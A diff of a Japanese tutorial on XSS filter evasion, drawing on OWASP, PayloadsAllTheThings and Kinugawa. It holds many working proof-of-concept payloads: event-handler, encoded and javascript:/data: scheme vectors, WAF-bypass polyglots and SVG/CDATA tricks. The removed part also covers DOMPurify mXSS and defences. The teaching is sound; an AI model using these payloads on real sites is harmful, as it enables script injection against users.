-#### 9.4 HTTPパラメータ汚染（HPP）
-
-同名パラメータを複数送り、フィルタが1つ目だけを検査する隙を突きます。
-
-```
-/share?content_type=1&title=regular&content_type=1;alert(1)
-```
-
-なぜ動くか: **HPP（HTTP Parameter Pollution: 同じ名前のパラメータを複数与え、サーバ／各処理層ごとに“どれを採用するか”の解釈が食い違うことを利用する攻撃）**。あるページはHTMLエンコード、別ページはJavaScriptエンコードしかしない、といった処理の不整合と組み合わさると、エンコードの穴を通って `content_type = 1;alert(1)` が実行に至る。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 10. 現代的なWAFバイパスとポリグロット
-
-チートシート末尾には、より新しいWAF回避向けの実戦ペイロードがまとまっています。抜粋します。
-
-```html
-<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
-<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>
-<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
-</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
-<a aa aaa aaaa ... href=j&#97v&#97script:&#97lert(1)>ClickMe</a>
-<form><button formaction=javascript&colon;alert(1)>CLICKME</button></form>
-<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;">
-<img src="x:gif" onerror="window['alert'](0)"></img>
-```
-
-なぜ動くか: これらは本セクションの技法を**組み合わせて**いる典型例です。`&colon;`（`:` のHTML実体名参照）・`&lpar;`（`(`）・`&period;`（`.`）で記号を実体参照化し、`e` でUnicodeエスケープ、`%00`（Nullバイト）でコメントやパスを分断、`throw` や `window.onerror=alert` で `alert()` という呼び出し形すら回避しています。1つのペイロードに複数のデコード層と代替経路を重ねることで、単純なパターン照合では到底追いつかなくなります。
-
-さらにチートシートは、複数の文脈（HTMLコンテキスト、属性内、JavaScript文字列内、URL内）のどこに落ちても発火する**ポリグロット（polyglot: 複数の言語・文脈で同時に有効になるように作られた1本の万能ペイロード）**の考え方も紹介します。代表的なものにGareth Heyesのポリグロットがあります（原理: 各文脈での「脱出（break out）」に必要な記号を1本に詰め込み、どの文脈でもどこかで実行に至るようにする）。
-
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-### 11. まとめ：なぜこれらは動くのか（原理の統合）
-
-ここまでの膨大なペイロードは、突き詰めると**わずか数個の原理**の組み合わせに還元できます。回避技法を丸暗記する必要はなく、この原理を理解していれば新種のペイポードも「なぜ動くか」を自力で説明できます。
-
-1. **パースとフィルタの非対称性**: フィルタは「入力文字列」を見るが、ブラウザは「修復・復号したあとのHTMLツリー／トークン列」を実行する。この2つがずれる限り抜け道は必ず残る（第6章の核心）。
-2. **多層デコード**: HTML実体参照 → URLエンコード → JavaScript文字列エスケープ …と、ブラウザは文脈ごとに何段もデコードする。フィルタのデコード段数がブラウザより浅ければ突破される（第4・5・8章）。
-3. **表現の非一意性**: 同じ1文字・同じ関数呼び出しに、事実上無限の表記がある（先頭ゼロ、大文字小文字、`fromCharCode`、`toString(基数)`、プロパティ名の文字列結合など）。ブラックリストは有限、表現は無限（第3・8章）。
-4. **実行経路の多さ**: JavaScriptは `<script>` だけでなく、イベントハンドラ・`javascript:`/`data:` スキーム・CSS・meta refresh・埋め込みタグからも起動する。1つの入口を塞いでも他が開いている（第7・9章）。
-5. **名前空間の切り替え（mutation XSSの土台）**: HTMLパーサは、`<svg>` や `<math>` の内側では**HTML名前空間から外部（foreign content）名前空間へ規則を切り替える**。この境界で、サニタイズ後の文字列がブラウザによって別の構造へ“変異（mutate）”することがある。これが後述のmutation XSSの根本原理。
-
----
-
-### 12. バージョン依存の回避に注意（陳腐化と、現代のサニタイザ回避）
-
-（以下は、2つの資料の内容を現代の文脈へ接続するための、一般的な知識に基づく補足解説です。）
-
-OWASPチートシートのペイロードは歴史的資産であり、**多くがブラウザ・バージョン依存**です。学習時は「いま動くか」と「なぜ当時動いたか」を分けて考えてください。
-
-- **すでに廃止・無効化された代表例**: CSSの `expression()`（IE限定、IE11以降で廃止）、`-moz-binding`（Firefox 57 / 2017年頃までにXBLごと廃止）、`DYNSRC`/`LOWSRC`（旧IE専用）、VBScriptスキーム（Edge以降で廃止）。これらは現行のChrome/Firefox/Safari/Edgeでは動作しません。
-- **いまも生きている核**: `<svg onload>`、`<img onerror>`、`javascript:`/`data:` スキーム、実体参照や `\u` エスケープによる難読化は、文脈次第で現在も有効です。
-
-現代のXSS回避の主戦場は、素のフィルタではなく**HTMLサニタイザ・ライブラリの回避**へ移りました。とくに **DOMPurify**（ユーザー入力HTMLから危険な要素・属性を除去する、事実上の標準ライブラリ）を対象とする **mutation XSS（mXSS: サニタイズは正しく行われたのに、その出力を `innerHTML` へ再代入した瞬間にブラウザのパーサが構造を“変異”させ、無害だったはずのマークアップが実行可能なコードに化ける現象）** が代表例です。原理は第11章の「5. 名前空間の切り替え」そのもので、`<svg>`/`<math>`/`<template>`/`<style>` の境界でのパース規則の食い違いを突きます。
-
-具体的なバージョン依存の例（対象バージョン・修正・公開年を明記）:
-
-- **DOMPurify < 2.0.17（修正: 2.0.17、2020年公開）**: Michał Bentkowski らが報告した、要素のネスト（入れ子）と名前空間の混同を利用したmXSSバイパス。この版までは、サニタイズ後の文字列が `innerHTML` 再解釈時に危険な構造へ復元され得た。2.0.17で修正。
-- **DOMPurify 2.2.x〜2.3.x台のバイパス（各パッチで順次修正、2021〜2022年）**: `<style>`／コメント／foreign content の扱いを突く複数のmXSSが継続的に報告・修正された。
-- **現行（DOMPurify 3.x、2023年以降）**: 多数の既知mXSSは塞がれているが、「サニタイザは常に最新へ保つ」「出力先コンテキストを固定する」ことが前提。**古いバージョンを使い続けること自体が脆弱性**になる、という点が実務上の教訓です。
-
-つまり、OWASPチートシートが示した「ブラウザは壊れた入力を修復して実行する」という20年来の原理は、フィルタからサニタイザへと対象を変えつつ、現在も生き続けています。
-
----
-
-### 13. では何をすべきか：正しい防御（結論）
-
-Invictiとチートシートの結論は一致しています。**「危険なものを探して消す（フィルタ／ブラックリスト）」を主対策にしてはならない。「出力先で無害化する（エスケープ／エンコード）」を主対策にせよ。** 具体的な指針は次のとおりです。
-
-1. **コンテキスト依存の出力エンコーディング（context-aware output encoding）を主対策にする。**
-   Invicti曰く「エンコーディングの選択は文脈に依存する。ブラウザは場所によって文字を違う方法でエンコード／デコードするから」。ユーザー入力が最終的に置かれる **sink（ユーザー入力が実行・解釈される危険な代入先。例: `innerHTML`、`href`、`<script>` ブロック内、`style` 属性）** ごとに、HTMLボディ用・HTML属性用・JavaScript文字列用・URL用・CSS用のエスケープを使い分ける。ここは第1章の防御セクション（出力エンコーディングの原理）と完全に接続します。
-
-2. **フィルタではなくエスケープ。** Invictiの中核命題「フィルタリングではなくエスケープを使うことがXSSを防ぐ唯一信頼できる方法」。ブラックリストは有限で、攻撃表現は無限だから（第11章の原理3）。
-
-3. **CSP（Content Security Policy: どこからスクリプトを読み込み・実行してよいかをブラウザに宣言するHTTPヘッダによる多層防御）を併用する。** ただしInvictiは「CSPは安全なコーディングを**補完**するものであって、置き換えるものではない」と釘を刺します。理想は `nonce`（1回限りの乱数トークンを付けたスクリプトだけを許可）や `strict-dynamic` を用いた厳格CSPで、インラインスクリプトと未許可ソースを原理的に遮断すること。
-
-4. **Trusted Types を導入する（対応ブラウザ）。** DOM系XSSの sink（`innerHTML` など）へ、検証を通した専用の型オブジェクト以外を代入できなくするブラウザ機構。文字列を直接 sink に流す経路を型システムで塞ぐため、mutation XSSを含む DOM XSS の温床を根本から断てる。
-
-5. **信頼できるフレームワーク／ライブラリに任せる。** モダンフレームワーク（React、Angular等）の自動エスケープや、保守されている最新版のサニタイザ（DOMPurify等）を使い、自前の正規表現フィルタを書かない。第12章のとおり、ライブラリは常に最新へ。
-
-6. **入力バリデーションは「多層防御の一枚」であって主対策ではない。** 形式・長さ・許可リスト（whitelist）による入力検証は有用だが、それ単独ではXSSを防げない。エスケープと組み合わせて初めて意味を持つ。
-
-7. **WAFは緩和策であって解決策ではない。** 既知パターンの一時的遮断には役立つが、アプリの文脈を持たないため回避され得る。「WAFが弾いた＝直った」ではない(false sense of security)。
-
-8. **継続的なセキュリティテスト。** 表現は無限に増えるため、スキャナやペネトレーションテストで「新しい回避に耐えられるか」を継続的に検証する。
-
-> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion
-> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
-
----
-
-#### このセクションの一行結論
-
-**フィルタ（ブラックリスト）は「壊れた入力を修復して実行するブラウザ」と「無限に増える表現」に対して構造的に負ける。防御の主軸は、入力を検閲することではなく、出力する場所（sink）の文脈に合わせて無害化（エスケープ／エンコード）することである。** 回避ペイロードの一つ一つは、この一文を裏づける実例にすぎません。
+> 出典: XSS Filter Evasion Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting — https://www.invicti.com/blog/web-security/xss-filter-evasion
 
 ---
 
 ## ペイロード集とブラウザXSSフィルタ回避（Kinugawa）
 
-前の節までで、XSS（クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）を「どういう発想で見つけ、どういう文脈で刺すか」という枠組みを学んできました。この節では、その枠組みに肉付けをする **二つの実戦資料** を精読して統合します。
+前の節までで、XSS（Cross-Site Scripting＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させてしまう脆弱性）を「どういう発想で見つけ、どのコンテキストに刺すか」という枠組みを学んできました。この節では、その枠組みに肉付けをする **二つの実戦資料** を精読して統合します。
 
-1. **PayloadsAllTheThings の XSS Injection**（swisskyrepo）——世界最大級の攻撃ペイロード（攻撃に使う入力文字列）カタログ。「この文脈ではどう書くか」をコンテキスト（context＝ユーザー入力が最終的に置かれる場所と、そこでのブラウザの解釈規則）別に引くための辞書です。
-2. **filterbypass**（Masato Kinugawa）——ブラウザに **組み込まれていた** XSS フィルタ（XSS Auditor / IE・Edge の XSS Filter）を回避するためのチートシート。「ブラウザ自身が防ごうとした XSS を、どうやってすり抜けたか」という、フィルタ回避の教科書的アーカイブです。
+1. **PayloadsAllTheThings の XSS Injection**（swisskyrepo）——世界最大級の攻撃ペイロード（payload＝攻撃を成立させるために送り込む実際の入力文字列）カタログ。「この文脈ではどう書くか」を、コンテキスト（context＝ユーザー入力が最終的に置かれる場所と、そこでのブラウザの解釈規則）別に引くための辞書です。
+2. **filterbypass**（Masato Kinugawa）——かつてブラウザに **組み込まれていた** XSS フィルタ（Chrome の XSS Auditor、IE / Edge の XSS Filter）を回避するためのチートシート。「ブラウザ自身が防ごうとした XSS を、どうやってすり抜けたか」を体系化した、フィルタ回避の教科書的アーカイブです。
 
-この二つを合わせて読むと、**「ペイロードは文脈で選び、フィルタは仕組みの隙間で抜く」** というこの節の核心が見えてきます。単なる文字列の暗記ではなく、**なぜその文字列がブラウザで実行に至るのか**——HTML パーサ（構文解析器）の状態遷移、文字コード（charset）の再解釈、名前空間（namespace）の切り替え——という「仕組み」まで掘り下げます。これがフィルタや WAF（Web Application Firewall＝Web アプリの手前で悪意ある通信を検知・遮断する仕組み）に勝つための本当の武器です。
+この二つを合わせて読むと、この節の核心——**「ペイロードは文脈で選び、フィルタは仕組みの隙間で抜く」**——が見えてきます。目的は文字列の丸暗記ではありません。**なぜその文字列がブラウザで実行に至るのか**、すなわち HTML パーサ（構文解析器）の状態遷移、文字コード（charset）の再解釈、名前空間（namespace）の切り替え、JavaScript の型変換——という「仕組み」まで掘り下げます。これがフィルタや WAF（Web Application Firewall）に勝つための本当の武器になります。
+
+> 本セクションの担当2資料（PayloadsAllTheThings XSS Injection、Kinugawa filterbypass）および補強2資料（XSS Filter Bypass Cheat Sheet、Fixed Bypass Archive）は、いずれも開放ネットワーク環境で直接取得できました。以下はその内容に基づく再構成です。
 
 ---
 
 ### 資料1: PayloadsAllTheThings — ペイロードは「文脈」で引く辞書
 
-PayloadsAllTheThings（略称 PTAT）は、XSS に限らずあらゆる Web 脆弱性のペイロードを集めた巨大リポジトリで、その XSS Injection セクションは「反射型（Reflected）」「保存型（Stored）」「DOM 型」の三分類から始まり、注入できる文脈ごとにペイロードを整理しています。この資料の正しい使い方は、**「まず自分の入力がどの文脈に落ちているかを特定し、その文脈の欄からペイロードを選ぶ」** ことです。同じ `alert(1)` を出すのでも、置かれる場所によって「動く書き方」がまったく違うからです。
+PayloadsAllTheThings（略称 PTAT）は、XSS に限らずあらゆる Web 脆弱性のペイロードを集めた巨大リポジトリです。その XSS Injection セクションは、まず XSS を三つに分類したうえで、注入できる文脈ごとにペイロードを整理しています。この資料の正しい使い方は、**「まず自分の入力がどの文脈に落ちているかを特定し、その文脈の欄からペイロードを選ぶ」** ことです。同じ `alert(1)` を出すのでも、置かれる場所によって「動く書き方」がまるで違うからです。
 
 > 出典: PayloadsAllTheThings — XSS Injection README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md
 
-まず三分類の定義を確認します。
+#### 三分類の定義
 
-- **反射型 XSS（Reflected）**: 攻撃コードを含む URL などを被害者がクリックした「その場」でコードが実行される型。攻撃者がメールで悪意ある JavaScript を仕込んだリンクを送り、クリック時にログイン情報を盗む、という典型例が挙げられています。サーバーには痕跡が残らず、被害者の一回のアクセスで完結します。
-- **保存型 XSS（Stored）**: 攻撃コードがサーバー側（DB など）に**保存**され、そのページを開いた**すべての閲覧者**に対して実行される型。ブログのコメント欄に仕込むのが典型で、影響範囲が最も広い。
-- **DOM 型 XSS（DOM-based）**: サーバーを一切介さず、ブラウザ内の JavaScript が DOM（Document Object Model＝ページを構成する要素のツリー構造）を操作する過程で発生する型。`innerHTML` や `location.href` への代入が典型的な sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）になります。サーバーに攻撃コードの記録が残らないため、検出・防御が最も難しいとされます。
+PTAT は冒頭で XSS を「攻撃者がクライアントサイドスクリプトを他ユーザーの見るページに注入できる脆弱性」と定義し、三つの型を挙げます。
+
+- **反射型 XSS（Reflected）**: 攻撃コードを含む URL などを被害者がクリックした「その場」で、レスポンスに反射（reflect）されたコードが実行される型。攻撃者がメールで悪意あるリンクを送り、クリック時に情報を盗む、という典型です。サーバーには攻撃コードが残りません。
+- **保存型 XSS（Stored）**: 攻撃コードがサーバー側（DB など）に**保存**され、そのページを開いた**すべての閲覧者**に対して実行される型。ブログのコメント欄が典型で、影響範囲が最も広い。
+- **DOM 型 XSS（DOM-based）**: サーバーを一切介さず、ブラウザ内の JavaScript が DOM（Document Object Model＝ページを構成する要素のツリー構造）を操作する過程で発生する型。`innerHTML` や `location` への代入が典型的な sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）になります。
 
 #### コンテキスト1: タグを丸ごと注入できる場合
 
-入力が HTML の本文としてそのまま出力される（`<` `>` がエスケープされていない）最も恵まれた文脈です。この場合、自分で好きなタグを書けるので、**スクリプトを実行できる「入れ物」となるタグ**を選ぶだけです。
+入力が HTML 本文としてそのまま出力される（`<` `>` がエスケープされていない）最も恵まれた文脈です。好きなタグを書けるので、**スクリプトの入れ物になるタグ**を選ぶだけです。
 
 ```html
 <script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
 ```
 
-なぜ動くか: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、`</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（script データ状態）に入るためです。出所が開発者か攻撃者かは問われません。ただし現代のフィルタは真っ先に `<script` を弾くので、実戦ではむしろ次の「イベントハンドラ経由」が本命になります。
+なぜ動くか: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、`</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（script data 状態）に入ります。出所が開発者か攻撃者かは問いません。2 行目 `<scr<script>ipt>` は、フィルタが文字列として `<script>` を検索・除去する実装に対する古典的回避です。フィルタが中央の `<script>` を丸ごと削除すると、残った `<scr` と `ipt>` が連結して `<script>` に**復元**されます——フィルタが見る「文字列」とブラウザが組み立てる「ツリー」のズレを突く手口の原型です。3 行目 `">` は、自分が属性値の中に落ちている場合に、まず属性と開始タグを閉じてから新タグを開くための脱出です。
+
+現代のフィルタは真っ先に `<script` を弾くので、実戦の本命は次の**イベントハンドラ経由**です。
 
 ```html
-<img src=x onerror=alert('XSS')>
-<svg onload=alert(1)>
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
 <svg/onload=alert('XSS')>
+<svg onload=alert(1)//
 <body onload=alert(/XSS/.source)>
 ```
 
-なぜ動くか: `<img src=x>` は「存在しない画像 x を読もうとして必ず失敗する」ため、失敗時に呼ばれる `onerror` イベントハンドラ（属性値に書いた JavaScript）が確実に発火します。`<svg onload>` や `<body onload>` は要素の読み込み完了時に発火します。**`<script>` を使わずに JavaScript を実行できる**のが要点で、`<script` を弾くフィルタを難なく越えます。`<svg/onload>` のように `/`（スラッシュ）でタグ名と属性を区切れるのは、HTML パーサが空白の代わりにスラッシュも属性の区切りとして許すためで、`svg onload` の間に空白を入れさせないフィルタを回避できます。
+なぜ動くか: `<img src=x>` は「存在しない画像 x を読もうとして必ず失敗する」ため、失敗時に呼ばれる `onerror` が確実に発火します。`<script>` を一切使わずに JS を実行できるのが要点です。`String.fromCharCode(88,83,83)` は文字コードから `"XSS"` を組み立てる書き方で、`'XSS'` という**リテラル文字列**を検索するフィルタを越えます。`<svg/onload>` の `/`（スラッシュ）は、HTML パーサが空白の代わりにスラッシュも属性区切りとして許すことを利用し、`svg` と `onload` の間に空白を入れさせないフィルタを回避します。末尾の `//` は行コメントで、注入位置より後ろにあるゴミ（`>` など）をコメントアウトして構文エラーを防ぎます。`/XSS/.source` は正規表現リテラルの `.source` プロパティで文字列 `"XSS"` を得る書き方です。
 
-**ユーザー操作を必要としないベクトル**（画面表示だけで自動発火するもの）は特に価値が高い。PTAT は HTML5 タグを使った自動発火型を多数挙げています。
+**ユーザー操作を必要としない自動発火**ベクタは特に価値が高い。PTAT は HTML5 タグの自動発火型を多数収録しています。
 
 ```html
 <input autofocus onfocus=alert(1)>
 <select autofocus onfocus=alert(1)>
 <textarea autofocus onfocus=alert(1)>
-<video src=_ onloadstart="alert(1)">
-<video><source onerror="javascript:alert(1)">
+<video/poster/onerror=alert(1)>
 <audio src onloadstart=alert(1)>
-<details open ontoggle="alert`1`">
 <marquee onstart=alert(1)>
+<details/open/ontoggle="alert`1`">
 ```
 
-なぜ動くか: `autofocus` 属性は「ページ表示時にこの要素へ自動でフォーカスを当てる」指示なので、`onfocus`（フォーカス取得時）と組み合わせると**ユーザーが何もしなくても**発火します。`<video>`/`<audio>` の `onloadstart` はメディア読み込み開始で、`<details open ontoggle>` は開いた状態で描画された瞬間に発火します。`alert`1`` はバッククォート（テンプレートリテラル）で関数を呼ぶ書き方で、`(` `)` を禁止するフィルタを越えます。
+なぜ動くか: `autofocus` は「表示時にこの要素へ自動でフォーカスを当てる」指示なので、`onfocus`（フォーカス取得時）と組み合わせると**ユーザーが何もしなくても**発火します。`onloadstart` はメディア読み込み開始、`<marquee>` の `onstart` はスクロール開始、`<details open ontoggle>` は開いた状態で描画された瞬間に発火します。``alert`1` `` はテンプレートリテラルで関数を呼ぶ書き方（タグ付きテンプレート）で、`(` `)` を禁止するフィルタを越えます。
 
-一方、**ユーザー操作を要するが、フィルタが警戒していない**珍しいイベントも収録されています。`onpointer*` 系（`onpointerover` `onpointerdown` `onpointerenter` `onpointermove` など）や、タッチ操作の `ontouchstart` / `ontouchend` / `ontouchmove` です。
+さらに PTAT は、警戒の薄い**ポインタ / タッチ / 隠し要素**系イベントも挙げます。
 
 ```html
 <div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
 <body ontouchstart=alert(1)>
-```
-
-なぜ収録されているか: `onmouseover` は有名で弾かれやすいが、`onpointerover`（マウス・タッチ・ペンを統一的に扱う新しいイベント）はブロックリスト（危険な文字列を列挙して弾く方式）に載っていないことが多い、という「フィルタの盲点」を突くためです。
-
-さらにマニアックな2例:
-
-```html
 <input type="hidden" accesskey="X" onclick="alert(1)">
 <input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
 ```
 
-なぜ動くか: 前者は `type="hidden"`（画面に見えない入力欄）でも `accesskey`（ショートカットキー）を割り当てられる挙動を利用し、被害者が `CTRL+SHIFT+X`（PTAT によると Firefox 130 以降・Chrome 108 以降で有効な組み合わせ）を押すと隠し要素の `onclick` が発火します。後者は `content-visibility:auto`（画面外の要素の描画を遅延する CSS 機能）の状態が切り替わったときに発火する新しいイベント `oncontentvisibilityautostatechange` を使い、スクロールで要素が視界に入った瞬間に発火させます。いずれも「新しいブラウザ機能はフィルタの更新より速く増える」ことの実例です。
+なぜ動くか: `on*` ハンドラは何百種類もあり、ブラックリストで全部は数え切れません。`onpointer*` はマウス移動で、`ontouch*` はタッチ操作で発火。`type=hidden` は本来非表示ですが、`accesskey="X"` を付けると「Alt+Shift+X」等のショートカットで `onclick` を強制発火でき、`oncontentvisibilityautostatechange` は `content-visibility:auto` の描画最適化状態が変わった瞬間に発火します。いずれも「危険そうなハンドラ名」の網の目を抜ける新種です。
 
-#### コンテキスト2: 属性値の中に注入する場合
+#### コンテキスト2: 属性値の中に落ちている場合
 
-入力が `<input value="ここ">` のように既存タグの属性値に入る場合、まず**属性を閉じてタグを抜け出す**必要があります。
+入力が既存タグの属性値 `value="..."` の中に出力される文脈です。まず引用符とタグを閉じて脱出するか、既存属性にイベントを継ぎ足します。DOM 由来の断片（`#` の後ろ＝フラグメント）も同様に扱えます。
 
 ```html
-"><script>alert('XSS')</script>
-"\><img src=x onerror=alert('XSS')>
-"\><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><img src=/ onerror=alert(2)>
+#"><img src=/ onerror=alert(2)>
 ```
 
-なぜ動くか: 先頭の `">` は「開いている属性値（`"`）と開始タグ（`>`）を強制的に閉じる」働きで、これで自分は「タグの外」に出られ、続けて新しいタグを書けます。`"\>` のようにバックスラッシュを挟むのは、一部の不完全なエスケープ処理（`"` だけを見張っている実装）を惑わせるためのバリエーションです。
+なぜ動くか: `">` で現在の属性値と開始タグを閉じ、続けて新しいタグを開けば、属性コンテキストから HTML コンテキストへ**脱出**できます。フィルタが引用符 `"` をエスケープしていなければ成立します。
 
-#### コンテキスト3: JavaScript の文字列リテラルの中に注入する場合
+#### コンテキスト3: `<script>` 内の JavaScript 文字列に落ちている場合
 
-入力が `<script>var q="ここ";</script>` のように、すでに実行される JavaScript の文字列の中に入る場合、**HTML タグは不要**で、JavaScript の構文として抜け出します。
+サーバーが `var q = "ユーザー入力";` のように JS の文字列リテラルへ入力を埋め込む文脈です。タグを注入する必要はなく、**JS の構文を閉じて**式を足します。
 
 ```javascript
-";alert(1);//
-'-alert(1)-'
 -(confirm)(document.domain)//
+; alert(1);//
 ```
 
-なぜ動くか: `";` で開いている文字列と文の両方を閉じ、`alert(1);` を新しい文として実行し、`//` で残り（元の `";` など）をコメント化して構文エラーを防ぎます。`'-alert(1)-'` は文字列連結の式の中に関数呼び出しを紛れ込ませる技法で、引用符の種類が `'` の場合に使います。この文脈は後述する Kinugawa の資料でも「XSS フィルタが守らない代表的な領域」として登場する重要ポイントです。
+なぜ動くか: すでに JS 実行コンテキストの中にいるので `<script>` は不要です。`"` で文字列を閉じ（サーバー出力に応じて）、`-` や `;` で式・文を区切って自分のコードを続け、`//` で後続をコメントアウトします。`(confirm)(...)` のように括弧で包むのは、`confirm(` という連続を検出するフィルタを崩すためです。
 
-#### コンテキスト4: URL 文脈（href / src）— `javascript:` と `data:`
+#### 文字エンコーディングによる難読化——なぜ「別の書き方」で動くのか
 
-入力が `<a href="ここ">` のようにリンク先やリソース先の URL として使われる場合、**危険なスキーム（プロトコル）**を使います。
-
-```html
-javascript:alert(1)
-javascript:prompt(1)
-data:text/html,<script>alert(0)</script>
-data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
-```
-
-なぜ動くか: `javascript:` スキームの URL は、リンクをたどった瞬間にその後ろの JavaScript が実行されます。`data:` スキームは「URL の中に文書の中身そのものを埋め込む」もので、`data:text/html,...` は新しい HTML 文書として解釈され、その中の `<script>` が動きます。`;base64,` を付ければ本文を Base64 でエンコードでき、`<` `>` を含まないので単純なフィルタを越えられます（例の Base64 は `<svg/onload=alert(2)>` を表します）。
-
-#### エンコーディングによるフィルタ回避
-
-`javascript:` や `alert` という文字列そのものを弾くフィルタに対しては、**「ブラウザは複数の表記を同じ文字として解釈する」** 性質を突きます。PTAT は多彩なエンコーディング回避を収録しています。
+PTAT の収録ペイロードの多くは、同じ意味を**別のエンコーディングで表現**してフィルタを抜きます。ここは「仕組み」の理解が必須です。
 
 ```html
-<!-- 文字参照（HTML entity）: 10進・16進 -->
-<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
-&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58...  <!-- javascript: -->
-
-<!-- JavaScript内の16進・Unicode・8進エスケープ -->
+<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
+<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
 <script>alert('22')</script>
 <script>eval('\x61lert(\'33\')')</script>
-\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)   <!-- javascript: -->
-ja...:alert(1)
-\152\141\166\141...072alert(1)   <!-- 8進数表現 -->
-
-<!-- 文字コードから文字列を組み立てる -->
-<script>alert(String.fromCharCode(88,83,83))</script>
-
-<!-- javascript: の途中に改行・タブを挟む -->
-java%0ascript:alert(1)   <!-- %0a = LF（改行） -->
-java%09script:alert(1)   <!-- %09 = 水平タブ -->
-java%0dscript:alert(1)   <!-- %0d = CR -->
-javascript://%0Aalert(1) <!-- // でコメント化してから改行で復帰 -->
-
-<!-- 各文字をバックスラッシュでエスケープ（無害化されない） -->
-\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
 ```
 
-なぜ動くか: `&#X61;` は文字参照で「a」を表し、ブラウザは属性値をパースする際にこれを実文字 `a` に復元してから解釈します。つまりフィルタが `alert` という並びを探しても、入力の見た目は `&#X61;&#X6C;...` なので一致しません。`a` `\x61` `\141`（8進）は JavaScript エンジンが「a」に解釈するエスケープで、`alert` は `alert` になります。`java%0ascript:` の `%0a`（改行）や `%09`（タブ）は、`javascript:` スキームの判定でブラウザがこれら制御文字を無視・除去するため、途中に挟んでも `javascript:` として成立し、`javascript:` という連続文字列を探すフィルタを裏切ります。**「フィルタが見る文字列」と「ブラウザが最終的に解釈する文字列」がズレる**——これがエンコーディング回避の統一原理で、この後の Kinugawa 資料でも文字コード（charset）レベルで同じ原理が繰り返し登場します。
+なぜ動くか: `&#x61;` は HTML 数値文字参照で、パーサが**属性値やテキストを読み込む段階で** `a` に復号します。つまり `&#X61;lert` はパース後に `alert` になる。重要なのは復号の**タイミングと場所**です。HTML 実体参照は「HTML 属性値の中」でしか復号されないので、`javascript:` スキームを実体参照で書いた `jav&#x61;script:` は href/data 属性でこそ効きますが、`<script>` タグ内の JS には効きません（HTML パーサは script data 状態では実体参照を復号しないため）。逆に `a`（Unicode エスケープ）や `\x61`（16 進エスケープ）は **JavaScript エンジンが**識別子・文字列として解釈するので、`<script>alert` は `alert` になります。**「どの層（HTML パーサ / JS エンジン / URL デコーダ）が、いつ、その表記を復号するか」** を分けて考えるのが、エンコーディング回避の原理です。
 
-#### 別フォーマットに潜む XSS（SVG・XML・Markdown・CSS）
+#### `javascript:` / `data:` スキームと制御文字
 
-XSS は HTML だけの話ではありません。ユーザーがアップロード・投稿できる各種フォーマットが sink になります。
-
-**SVG ファイル**: SVG（ベクター画像形式）は実体が XML で、`<script>` を含められます。画像アップロード機能で SVG を受け付けていると、それを直接開いた被害者のブラウザで JavaScript が動きます。
-
-```xml
-<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
-<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
-<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
+```
+javascript:prompt(1)
+javascript://anything%0D%0A%0D%0Awindow.alert(1)
+java%0ascript:alert(1)
+java%09script:alert(1)
+data:text/html,<script>alert(0)</script>
+data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
+<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 ```
 
-なぜ動くか: SVG のルート要素に `onload` を書けば読み込み時に発火します。`<![CDATA[...]]>`（文字データ節＝中身を「ただの文字」として扱う XML の記法）と閉じタグを組み合わせるのは、`<desc>` や `<title>` の中身をエスケープするサニタイザ（sanitizer＝危険な要素・属性を除去する処理）の想定を、パーサの CDATA 処理でずらして `<script>` を「外」に出す技法です。PTAT は複数ベクトルを1ファイルに詰めた検証用 SVG（コードネーム red lightning、作者 noraj）も収録しており、`onload` 属性・`<desc>` 内 script・`<foreignObject>` 内 script・`<foreignObject>` 内 iframe(`src="javascript:..."`)・`<title>` 内 script・`<animateTransform onbegin>`・通常の `<script>` を一挙に試せます。
